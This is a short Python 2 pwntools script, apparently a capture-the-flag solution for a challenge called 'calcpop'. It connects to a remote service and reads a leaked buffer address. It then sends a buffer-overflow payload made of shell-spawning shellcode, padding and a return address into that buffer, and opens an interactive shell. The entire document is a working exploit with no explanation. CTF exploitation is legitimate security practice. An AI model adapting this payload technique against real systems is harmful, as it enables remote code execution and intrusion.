#!/usr/bin/python2
from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'
r = remote('calcpop-4gh07blg.9447.plumbing', 9447)

r.recvline()
r.sendline('a')
buf = int(r.recvline().split(' ')[-1], 16)

r.sendline(flat(
    '201527 0 ',
    asm(shellcraft.sh()),
    (157- len('201527 0 ') - 23) * 'x',
    p32(buf + len('201527 0 '))
))
r.interactive()
r.close()
